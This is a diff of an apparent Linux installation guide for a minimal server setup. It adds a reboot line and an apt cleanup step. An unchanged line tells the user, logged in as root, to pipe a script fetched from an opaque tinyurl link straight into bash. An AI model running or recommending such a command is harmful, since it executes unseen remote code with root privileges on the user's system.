@@ -21,13 +21,18 @@ Username: stra
 
 > ⚠️ This will result in a minimal, lightweight installation—ideal for servers or headless environments.
 
-## 2. Log in as root
-
-After rebooting the system, log in with:
+## 2. Install all
 
 ```bash
 Username: root
 Password: [your root password]
 
 wget --no-cache -qO- https://tinyurl.com/y2y5b6x7 | bash
+reboot
+```
+
+## 3. Cleaning
+
+```bash
+sudo apt clean
 ```
